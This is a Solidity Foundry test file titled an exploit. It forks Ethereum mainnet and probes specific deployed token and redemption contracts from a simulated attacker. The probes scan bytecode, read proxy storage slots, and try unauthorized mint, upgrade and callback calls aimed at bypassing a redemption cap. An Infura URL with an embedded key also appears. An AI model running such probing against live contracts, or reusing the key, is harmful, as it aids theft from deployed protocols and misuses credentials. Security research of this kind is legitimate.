// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
    function totalSupply() external view returns (uint256);
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
}

contract IAUTokenExploit is Test {
    address constant REDEMPTION_CONTROLLER = 0xdF2eE409BEe416A53b5C040d8e6dAD4a7cEb2510;
    address constant REDEMPTION_0 = 0xcd63a29FAfF07130d3Af89bB4f40778938AaBB85;
    address constant VAULT = 0x551d155760ae96050439AD24Ae98A96c765d761B;
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address constant IAU = 0x1B6238E95bBCABEE58997c99BaDD4154ad68BA92;

    string RPC_URL = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c";
    address attacker;

    function setUp() public {
        vm.createSelectFork(RPC_URL);
        attacker = makeAddr("attacker");
        vm.deal(attacker, 100 ether);
    }

    function test_AnalyzeIAUToken() public view {
        console.log("=== ANALYZING IAU TOKEN ===\n");

        console.log("IAU address:", IAU);
        console.log("Code size:", IAU.code.length);

        // Basic ERC20 info
        (bool success, bytes memory data) = IAU.staticcall(
            abi.encodeWithSignature("name()")
        );
        if (success) {
            console.log("Name:", abi.decode(data, (string)));
        }

        (success, data) = IAU.staticcall(
            abi.encodeWithSignature("symbol()")
        );
        if (success) {
            console.log("Symbol:", abi.decode(data, (string)));
        }

        (success, data) = IAU.staticcall(
            abi.encodeWithSignature("totalSupply()")
        );
        if (success) {
            console.log("Total supply:", abi.decode(data, (uint256)) / 1e18);
        }

        // Check owner
        (success, data) = IAU.staticcall(
            abi.encodeWithSignature("owner()")
        );
        if (success && data.length == 32) {
            console.log("Owner:", abi.decode(data, (address)));
        }
    }

    function test_FindIAUDelegatecallTargets() public view {
        console.log("=== FINDING IAU DELEGATECALL TARGETS ===\n");

        bytes memory code = IAU.code;

        // Find all DELEGATECALL and their context
        console.log("DELEGATECALL positions and context:");
        
        for (uint i = 0; i < code.length; i++) {
            if (uint8(code[i]) == 0xf4) { // DELEGATECALL
                console.log("\nDELEGATECALL at offset:", i);

                // Look for SLOAD or PUSH20 before (address source)
                for (uint j = i > 30 ? i - 30 : 0; j < i; j++) {
                    if (uint8(code[j]) == 0x54) { // SLOAD
                        console.log("  SLOAD at:", j);
                    }
                    if (uint8(code[j]) == 0x73) { // PUSH20
                        console.log("  PUSH20 at:", j);
                    }
                }
            }
        }

        // Check EIP-1967 implementation slot
        bytes32 implSlot = bytes32(uint256(keccak256("eip1967.proxy.implementation")) - 1);
        bytes32 implValue = vm.load(IAU, implSlot);
        console.log("\nEIP-1967 implementation slot:");
        console.logBytes32(implValue);

        if (implValue != bytes32(0)) {
            address impl = address(uint160(uint256(implValue)));
            console.log("Implementation address:", impl);
            console.log("Implementation code size:", impl.code.length);
        }
    }

    function test_CheckIAUProxyStatus() public view {
        console.log("=== CHECKING IAU PROXY STATUS ===\n");

        // Standard storage slots
        console.log("Storage slots 0-10:");
        for (uint i = 0; i < 10; i++) {
            bytes32 slot = vm.load(IAU, bytes32(i));
            if (slot != bytes32(0)) {
                console.log("Slot", i, ":");
                console.logBytes32(slot);
            }
        }

        // EIP-1967 slots
        bytes32 implSlot = bytes32(uint256(keccak256("eip1967.proxy.implementation")) - 1);
        bytes32 adminSlot = bytes32(uint256(keccak256("eip1967.proxy.admin")) - 1);
        bytes32 beaconSlot = bytes32(uint256(keccak256("eip1967.proxy.beacon")) - 1);

        console.log("\nEIP-1967 slots:");
        console.log("Implementation:");
        console.logBytes32(vm.load(IAU, implSlot));
        console.log("Admin:");
        console.logBytes32(vm.load(IAU, adminSlot));
        console.log("Beacon:");
        console.logBytes32(vm.load(IAU, beaconSlot));
    }

    function test_FindIAUFunctionSelectors() public view {
        console.log("=== FINDING IAU FUNCTION SELECTORS ===\n");

        bytes memory code = IAU.code;

        console.log("Function selectors in IAU:");
        for (uint i = 0; i + 5 < code.length; i++) {
            if (uint8(code[i]) == 0x63) { // PUSH4
                bytes4 selector = bytes4(bytes.concat(code[i+1], code[i+2], code[i+3], code[i+4]));
                
                for (uint j = i + 5; j < i + 15 && j < code.length; j++) {
                    if (uint8(code[j]) == 0x14) { // EQ
                        console.logBytes4(selector);
                        break;
                    }
                }
            }
        }
    }

    function test_CheckIAUCallbacks() public view {
        console.log("=== CHECKING IAU FOR CALLBACKS ===\n");

        bytes memory code = IAU.code;

        // Look for callback-related selectors
        bytes4[] memory callbackSels = new bytes4[](15);
        callbackSels[0] = bytes4(keccak256("onTokenTransfer(address,uint256,bytes)"));
        callbackSels[1] = bytes4(keccak256("tokensReceived(address,address,address,uint256,bytes,bytes)"));
        callbackSels[2] = bytes4(keccak256("transferAndCall(address,uint256,bytes)"));
        callbackSels[3] = bytes4(keccak256("approveAndCall(address,uint256,bytes)"));
        callbackSels[4] = bytes4(keccak256("_beforeTokenTransfer(address,address,uint256)"));
        callbackSels[5] = bytes4(keccak256("_afterTokenTransfer(address,address,uint256)"));
        callbackSels[6] = bytes4(keccak256("mint(address,uint256)"));
        callbackSels[7] = bytes4(keccak256("burn(address,uint256)"));
        callbackSels[8] = bytes4(keccak256("burnFrom(address,uint256)"));
        callbackSels[9] = bytes4(keccak256("permit(address,address,uint256,uint256,uint8,bytes32,bytes32)"));
        callbackSels[10] = bytes4(keccak256("flashLoan(address,address,uint256,bytes)"));
        callbackSels[11] = bytes4(keccak256("onFlashLoan(address,address,uint256,uint256,bytes)"));
        callbackSels[12] = bytes4(keccak256("execute(address,bytes)"));
        callbackSels[13] = bytes4(keccak256("multicall(bytes[])"));
        callbackSels[14] = bytes4(keccak256("delegateCall(address,bytes)"));

        string[15] memory names = [
            "onTokenTransfer",
            "tokensReceived (ERC777)",
            "transferAndCall",
            "approveAndCall",
            "_beforeTokenTransfer",
            "_afterTokenTransfer",
            "mint",
            "burn",
            "burnFrom",
            "permit",
            "flashLoan",
            "onFlashLoan",
            "execute",
            "multicall",
            "delegateCall"
        ];

        console.log("Searching for callbacks in IAU:");
        for (uint s = 0; s < callbackSels.length; s++) {
            for (uint i = 0; i + 3 < code.length; i++) {
                bytes4 sel = bytes4(bytes.concat(code[i], code[i+1], code[i+2], code[i+3]));
                if (sel == callbackSels[s]) {
                    console.log("  Found:", names[s]);
                    break;
                }
            }
        }
    }

    function test_TryIAUCallbacks() public {
        console.log("=== TRYING IAU CALLBACKS ===\n");

        deal(IAU, attacker, 1000e18);

        vm.startPrank(attacker);

        // Try transferAndCall
        console.log("Trying transferAndCall...");
        (bool success, ) = IAU.call(
            abi.encodeWithSignature(
                "transferAndCall(address,uint256,bytes)",
                REDEMPTION_0,
                100e18,
                abi.encode(attacker, uint256(1e18))
            )
        );
        console.log("Success:", success);

        // Try approveAndCall
        console.log("\nTrying approveAndCall...");
        (success, ) = IAU.call(
            abi.encodeWithSignature(
                "approveAndCall(address,uint256,bytes)",
                REDEMPTION_0,
                100e18,
                abi.encode(attacker)
            )
        );
        console.log("Success:", success);

        vm.stopPrank();
    }

    function test_CheckIAUMintBurn() public {
        console.log("=== CHECKING IAU MINT/BURN ===\n");

        // If we can mint IAU, we can bypass the redemption cap

        vm.startPrank(attacker);

        console.log("Trying mint(attacker, 1000e18)...");
        (bool success, ) = IAU.call(
            abi.encodeWithSignature("mint(address,uint256)", attacker, 1000e18)
        );
        console.log("Success:", success);

        // Try minter role
        console.log("\nTrying MINTER_ROLE check...");
        bytes memory data;
        (success, data) = IAU.staticcall(
            abi.encodeWithSignature("MINTER_ROLE()")
        );
        if (success && data.length == 32) {
            bytes32 role = abi.decode(data, (bytes32));
            console.log("MINTER_ROLE:");
            console.logBytes32(role);

            // Check if we have the role
            (success, data) = IAU.staticcall(
                abi.encodeWithSignature("hasRole(bytes32,address)", role, attacker)
            );
            if (success && data.length == 32) {
                bool hasRole = abi.decode(data, (bool));
                console.log("Attacker has MINTER_ROLE:", hasRole);
            }
        }

        vm.stopPrank();
    }

    function test_CheckIAUUpgradeability() public {
        console.log("=== CHECKING IAU UPGRADEABILITY ===\n");

        // If IAU is upgradeable and we can call upgrade functions...

        vm.startPrank(attacker);

        // Try upgradeToAndCall
        console.log("Trying upgradeToAndCall...");
        (bool success, ) = IAU.call(
            abi.encodeWithSignature(
                "upgradeToAndCall(address,bytes)",
                attacker,
                ""
            )
        );
        console.log("Success:", success);

        // Try upgradeTo
        console.log("\nTrying upgradeTo...");
        (success, ) = IAU.call(
            abi.encodeWithSignature("upgradeTo(address)", attacker)
        );
        console.log("Success:", success);

        vm.stopPrank();
    }
}
